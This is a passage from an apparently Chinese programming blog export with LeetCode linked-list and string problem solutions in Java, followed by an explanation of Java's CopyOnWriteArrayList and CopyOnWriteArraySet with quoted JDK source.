<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">compressString</span><span class="params">(String S)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (S == <span class="keyword">null</span> || S.length() &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> S;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">char</span>[] chars = S.toCharArray();</span><br><span class="line">        </span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">int</span> currentChar = chars[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; S.length(); i++) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (chars[i] == currentChar) &#123;</span><br><span class="line">        		count++;</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		sb.append((<span class="keyword">char</span>) currentChar).append(count);</span><br><span class="line">        		currentChar = chars[i];</span><br><span class="line">        		count = <span class="number">1</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.append((<span class="keyword">char</span>) currentChar).append(count).length() &lt; S.length() ? sb.toString(): S;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题 01.05 一次编辑</title>
    <url>/2020/04/08/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-01.05-%E4%B8%80%E6%AC%A1%E7%BC%96%E8%BE%91/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>字符串有三种编辑操作:插入一个字符、删除一个字符或者替换一个字符。 给定两个字符串，编写一个函数判定它们是否只需要一次(或者零次)编辑。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: </span><br><span class="line">first &#x3D; &quot;pale&quot;</span><br><span class="line">second &#x3D; &quot;ple&quot;</span><br><span class="line">输出: True</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: </span><br><span class="line">first = <span class="string">"pales"</span></span><br><span class="line">second = <span class="string">"pal"</span></span><br><span class="line">输出: False</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>双指针</p>
<p>如果两个字符串长度相同，按照顺序比较各个位置上的字符是否相等，不相等的个数超过1，返回false</p>
<p>如果两个字符串长度不相等，同样是遍历两个字符串，但是遇到不相等的情况时，只把长的字符串指针往后移，同时统计不相等的个数，超过1返回false</p>
<p>因为，按照题目限制，如果两个字符串可以一次编辑并且不相等的话只可能是在同位置上替换了一个字符或者新增或者删除了一个字符，所以要把长的往后移。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">oneEditAway</span><span class="params">(String first, String second)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">int</span> len1 = Math.max(first.length(), second.length());</span><br><span class="line">			<span class="keyword">int</span> len2 = Math.min(first.length(), second.length());</span><br><span class="line">			<span class="keyword">if</span> (len1 - len2 &gt; <span class="number">1</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// first为长字符串，second为短字符串</span></span><br><span class="line">			<span class="keyword">if</span> (len1 != first.length()) &#123;</span><br><span class="line">				String tmp = first;</span><br><span class="line">				first = second;</span><br><span class="line">				second = tmp;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">			<span class="comment">// 分两种情况</span></span><br><span class="line">			<span class="keyword">if</span> (len1 == len2) &#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len1; i++) &#123;</span><br><span class="line">					<span class="keyword">if</span> (first.charAt(i) != second.charAt(i))</span><br><span class="line">						count++;</span><br><span class="line">					<span class="keyword">if</span> (count &gt; <span class="number">1</span>)</span><br><span class="line">						<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; len2; j++) &#123;</span><br><span class="line">					<span class="keyword">if</span> (count &gt; <span class="number">1</span>)</span><br><span class="line">						<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">					<span class="keyword">if</span> (first.charAt(j) != second.charAt(i)) &#123;</span><br><span class="line">						count++;</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					i++;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题 02.03 删除中间节点</title>
    <url>/2020/04/08/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-02.03-%E5%88%A0%E9%99%A4%E4%B8%AD%E9%97%B4%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>实现一种算法，删除单向链表中间的某个节点（除了第一个和最后一个节点，不一定是中间节点），假定你只能访问该节点。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：单向链表a-&gt;b-&gt;c-&gt;d-&gt;e-&gt;f中的节点c</span><br><span class="line">结果：不返回任何数据，但该链表变为a-&gt;b-&gt;d-&gt;e-&gt;f</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>将后一个节点的值拷贝至当前节点</p>
<p>当前节点的next赋值为后一个节点的next</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(ListNode node)</span> </span>&#123;</span><br><span class="line">        node.val = node.next.val;</span><br><span class="line">        node.next = node.next.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题 06 从尾到头打印链表</title>
    <url>/2020/04/08/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-06-%E4%BB%8E%E5%B0%BE%E5%88%B0%E5%A4%B4%E6%89%93%E5%8D%B0%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>输入一个链表的头节点，从尾到头反过来返回每个节点的值（用数组返回）。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：head &#x3D; [1,3,2]</span><br><span class="line">输出：[2,3,1]</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>递归</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] reversePrint(ListNode head) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == head) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode p = head;</span><br><span class="line"></span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        reverse(list, p);</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[list.size()];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; list.size();i++) &#123;</span><br><span class="line">            result[i] = list.get(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(List&lt;Integer&gt; list, ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == head) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        reverse(list, head.next);</span><br><span class="line">        list.add(head.val);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>链表</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题 02.07 链表相交</title>
    <url>/2020/04/08/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-02.07-%E9%93%BE%E8%A1%A8%E7%9B%B8%E4%BA%A4/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个（单向）链表，判定它们是否相交并返回交点。请注意相交的定义基于节点的引用，而不是基于节点的值。换句话说，如果一个链表的第k个节点与另一个链表的第j个节点是同一节点（引用完全相同），则这两个链表相交。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：intersectVal &#x3D; 8, listA &#x3D; [4,1,8,4,5], listB &#x3D; [5,0,1,8,4,5], skipA &#x3D; 2, skipB &#x3D; 3</span><br><span class="line">输出：Reference of the node with value &#x3D; 8</span><br><span class="line">输入解释：相交节点的值为 8 （注意，如果两个列表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [4,1,8,4,5]，链表 B 为 [5,0,1,8,4,5]。在 A 中，相交节点前有 2 个节点；在 B 中，相交节点前有 3 个节点。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：intersectVal &#x3D; 2, listA &#x3D; [0,9,1,2,4], listB &#x3D; [3,2,4], skipA &#x3D; 3, skipB &#x3D; 1</span><br><span class="line">输出：Reference of the node with value &#x3D; 2</span><br><span class="line">输入解释：相交节点的值为 2 （注意，如果两个列表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [0,9,1,2,4]，链表 B 为 [3,2,4]。在 A 中，相交节点前有 3 个节点；在 B 中，相交节点前有 1 个节点。</span><br></pre></td></tr></table></figure>



<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：intersectVal &#x3D; 0, listA &#x3D; [2,6,4], listB &#x3D; [1,5], skipA &#x3D; 3, skipB &#x3D; 2</span><br><span class="line">输出：null</span><br><span class="line">输入解释：从各自的表头开始算起，链表 A 为 [2,6,4]，链表 B 为 [1,5]。由于这两个链表不相交，所以 intersectVal 必须为 0，而 skipA 和 skipB 可以是任意值。</span><br><span class="line">解释：这两个链表不相交，因此返回 null。</span><br></pre></td></tr></table></figure>

<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ul>
<li>如果两个链表没有交点，返回 null 。</li>
<li>在返回结果后，两个链表仍须保持原有的结构。</li>
<li>可假定整个链表结构中没有循环。</li>
<li>程序尽量满足 O(n) 时间复杂度，且仅用 O(1) 内存。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：借助HashSet"><a href="#解法一：借助HashSet" class="headerlink" title="解法一：借助HashSet"></a>解法一：借助HashSet</h3><p>遍历其中某一个链表，全放入HashSet中。然后遍历剩下一个链表，第一个在HashSet中出现的链表节点就是交点。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 借助HashSet</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> headA</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> headB</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> ListNode <span class="title">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> </span>&#123;</span><br><span class="line">		HashSet&lt;ListNode&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">null</span> != headA) &#123;</span><br><span class="line">			set.add(headA);</span><br><span class="line">			headA = headA.next;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">null</span> != headB) &#123;</span><br><span class="line">			<span class="keyword">if</span> (set.contains(headB)) &#123;</span><br><span class="line">				<span class="keyword">return</span> headB;</span><br><span class="line">			&#125;</span><br><span class="line">			headB = headB.next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：构造环形链表"><a href="#解法二：构造环形链表" class="headerlink" title="解法二：构造环形链表"></a>解法二：构造环形链表</h3><p>把其中一个链表的头尾相连，对另一个链表采用快慢指针。如果这两个链表相交，两个快慢指针一定能够相遇，之后再采用Floyd算法，找到相交点。否则其中任意一个指针到达null，说明不存在相交的情况。</p>
<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>观察上图例子可知，两个链表长度不相等，并且相交，那么，在交点之前的长度差就是abs(l1.length - l2.length)和两个完整的链表长度差是一致的。因为从交点之后两个链表的长度就一致了。</p>
<p>那么，就可以先遍历2次分别求出两个链表的长度，记为l1，l2.</p>
<p>使用两个指针，p1，p2.p1指向l1的首部，p2指向l2的首部。如果l1 &gt; l2的话，p1先前移(l1-l2)个节点，然后p1，p2同时一步一步移动。</p>
<p>如果期间两个指针指向的链表节点相等（非null），则该节点就是交点，否则，不存在交点。</p>
<h3 id="解法四："><a href="#解法四：" class="headerlink" title="解法四："></a>解法四：</h3><p>同时遍历链表A和B，如果A到达链表尾，赋值B链表的头，继续遍历。B到达链表尾赋值A的头，继续遍历。无论相交与否，两者都会在null或者相交的交点处相遇。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> </span>&#123;</span><br><span class="line">        ListNode a = headA;</span><br><span class="line">        ListNode b = headB;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == a || <span class="keyword">null</span> == b) &#123;</span><br><span class="line">        	<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (a != b) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (<span class="keyword">null</span> == a) &#123;</span><br><span class="line">        		a = headB;</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		a = a.next;</span><br><span class="line">        	&#125;</span><br><span class="line">        	</span><br><span class="line">        	<span class="keyword">if</span> (<span class="keyword">null</span> == b) &#123;</span><br><span class="line">        		b = headA;</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		b = b.next;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>链表</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title>142.环路检测</title>
    <url>/2020/04/08/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-02.08-%E7%8E%AF%E8%B7%AF%E6%A3%80%E6%B5%8B/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个有环链表，实现一个算法返回环路的开头节点。<br>有环链表的定义：在链表中某个节点的next元素指向在它前面出现过的节点，则表明该链表存在环路。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：head = [<span class="number">3</span>,<span class="number">2</span>,<span class="number">0</span>,-<span class="number">4</span>], pos = <span class="number">1</span></span><br><span class="line">输出：<span class="keyword">true</span></span><br><span class="line">解释：链表中有一个环，其尾部连接到第二个节点。</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist.png" alt></p>
<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：head = [<span class="number">1</span>,<span class="number">2</span>], pos = <span class="number">0</span></span><br><span class="line">输出：<span class="keyword">true</span></span><br><span class="line">解释：链表中有一个环，其尾部连接到第一个节点。</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test2.png" alt></p>
<h2 id="示例3"><a href="#示例3" class="headerlink" title="示例3"></a>示例3</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：head = [<span class="number">1</span>], pos = -<span class="number">1</span></span><br><span class="line">输出：<span class="keyword">false</span></span><br><span class="line">解释：链表中没有环。</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test3.png" alt></p>
<h2 id="进阶："><a href="#进阶：" class="headerlink" title="进阶："></a>进阶：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">你是否可以不用额外空间解决此题？</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：Floyd-算法"><a href="#解法一：Floyd-算法" class="headerlink" title="解法一：Floyd 算法"></a>解法一：Floyd 算法</h3><p>Floyd 的算法被划分成两个不同的 <em>阶段</em> 。在第一阶段，找出列表中是否有环，如果没有环，可以直接返回 <code>null</code> 并退出。否则，用 <code>相遇节点</code> 来找到环的入口。</p>
<p>首先我们初始化额外的两个指针： ptr1 ，指向链表的头， ptr2 指向相遇点。然后，我们每次将它们往前移动一步，直到它们相遇，它们相遇的点就是环的入口，返回这个节点。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">detectCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">		ListNode slow = head;</span><br><span class="line">		ListNode fast = head;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (fast == <span class="keyword">null</span> || fast.next == <span class="keyword">null</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			slow = slow.next;</span><br><span class="line"></span><br><span class="line">			fast = fast.next.next;</span><br><span class="line">			<span class="keyword">if</span> (fast == slow) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		slow = head;</span><br><span class="line">		<span class="keyword">while</span> (slow != fast) &#123;</span><br><span class="line">			slow = slow.next;</span><br><span class="line">			fast = fast.next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> slow;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：借助HashSet"><a href="#解法二：借助HashSet" class="headerlink" title="解法二：借助HashSet"></a>解法二：借助HashSet</h3><p>如果我们用一个 <code>Set</code> 保存已经访问过的节点，我们可以遍历整个列表并返回第一个出现重复的节点。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">detectCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        Set&lt;ListNode&gt; visited = <span class="keyword">new</span> HashSet&lt;ListNode&gt;();</span><br><span class="line"></span><br><span class="line">        ListNode node = head;</span><br><span class="line">        <span class="keyword">while</span> (node != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (visited.contains(node)) &#123;</span><br><span class="line">                <span class="keyword">return</span> node;</span><br><span class="line">            &#125;</span><br><span class="line">            visited.add(node);</span><br><span class="line">            node = node.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>Java中的COW</title>
    <url>/2020/04/08/Java/Java%E5%9F%BA%E7%A1%80/2020-04-08-Java-COW/</url>
    <content><![CDATA[<h1 id="Java中的COW"><a href="#Java中的COW" class="headerlink" title="Java中的COW"></a>Java中的COW</h1><p>“COW”全称Copy-On-Write，是一种用于程序设计中的优化策略。其基本思路是，多线程读的时候共享一个数据结构，但是在写的时候，单独拷贝一个新的数据结构出来，在这个新的数据结构上添加数据，而后，将引用指向这个新的数据结构。Java提供了两个COW数据结构，分别是CopyOnWriteArrayList和CopyOnWriteArraySet。</p>
<h2 id="CopyOnWriteArrayList"><a href="#CopyOnWriteArrayList" class="headerlink" title="CopyOnWriteArrayList"></a>CopyOnWriteArrayList</h2><h3 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h3><p>根据CopyOnWriteArrayList的特性，看下它的add方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Appends the specified element to the end of this list.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> e element to be appended to this list</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; (as specified by &#123;<span class="doctag">@link</span> Collection#add&#125;)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> ReentrantLock lock = <span class="keyword">this</span>.lock;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object[] elements = getArray();</span><br><span class="line">            <span class="keyword">int</span> len = elements.length;</span><br><span class="line">            Object[] newElements = Arrays.copyOf(elements, len + <span class="number">1</span>);</span><br><span class="line">            newElements[len] = e;</span><br><span class="line">            setArray(newElements);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>添加元素主要分几个步骤：</p>
<ol>
<li>首先加锁，如果不加锁的话，并发添加的时候，会多产生N多个数组副本</li>
<li>拷贝一份新数组</li>
<li>将新元素添加到新数组的末尾</li>
<li>将原数组的引用指向新数组</li>
</ol>
<p>在指定位置添加元素也一样</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Inserts the specified element at the specified position in this</span></span><br><span class="line"><span class="comment">     * list. Shifts the element currently at that position (if any) and</span></span><br><span class="line"><span class="comment">     * any subsequent elements to the right (adds one to their indices).</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IndexOutOfBoundsException &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> ReentrantLock lock = <span class="keyword">this</span>.lock;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object[] elements = getArray();</span><br><span class="line">            <span class="keyword">int</span> len = elements.length;</span><br><span class="line">            <span class="keyword">if</span> (index &gt; len || index &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException(<span class="string">"Index: "</span>+index+</span><br><span class="line">                                                    <span class="string">", Size: "</span>+len);</span><br><span class="line">            Object[] newElements;</span><br><span class="line">            <span class="keyword">int</span> numMoved = len - index;</span><br><span class="line">            <span class="keyword">if</span> (numMoved == <span class="number">0</span>)</span><br><span class="line">                newElements = Arrays.copyOf(elements, len + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                newElements = <span class="keyword">new</span> Object[len + <span class="number">1</span>];</span><br><span class="line">                System.arraycopy(elements, <span class="number">0</span>, newElements, <span class="number">0</span>, index);</span><br><span class="line">                System.arraycopy(elements, index, newElements, index + <span class="number">1</span>,</span><br><span class="line">                                 numMoved);</span><br><span class="line">            &#125;</span><br><span class="line">            newElements[index] = element;</span><br><span class="line">            setArray(newElements);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="查找元素"><a href="#查找元素" class="headerlink" title="查找元素"></a>查找元素</h3><p>不加锁，直接读</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">   private E get(Object[] a, int index) &#123;</span><br><span class="line">       return (E) a[index];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h2 id="CopyOnWriteArraySet"><a href="#CopyOnWriteArraySet" class="headerlink" title="CopyOnWriteArraySet"></a>CopyOnWriteArraySet</h2><h3 id="添加元素-1"><a href="#添加元素-1" class="headerlink" title="添加元素"></a>添加元素</h3><p>CopyOnWriteArraySet底层实现和CopyOnWriteArrayList是一致的，区别就在于添加元素的时候，它判断了元素是不是已经在数组中了，已经在的话，直接返回false，否则添加新元素。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Adds the specified element to this set if it is not already present.</span></span><br><span class="line"><span class="comment">     * More formally, adds the specified element &#123;<span class="doctag">@code</span> e&#125; to this set if</span></span><br><span class="line"><span class="comment">     * the set contains no element &#123;<span class="doctag">@code</span> e2&#125; such that</span></span><br><span class="line"><span class="comment">     * &lt;tt&gt;(e==null&amp;nbsp;?&amp;nbsp;e2==null&amp;nbsp;:&amp;nbsp;e.equals(e2))&lt;/tt&gt;.</span></span><br><span class="line"><span class="comment">     * If this set already contains the element, the call leaves the set</span></span><br><span class="line"><span class="comment">     * unchanged and returns &#123;<span class="doctag">@code</span> false&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> e element to be added to this set</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if this set did not already contain the specified</span></span><br><span class="line"><span class="comment">     *         element</span></span><br><span class="line"><span class="comment">     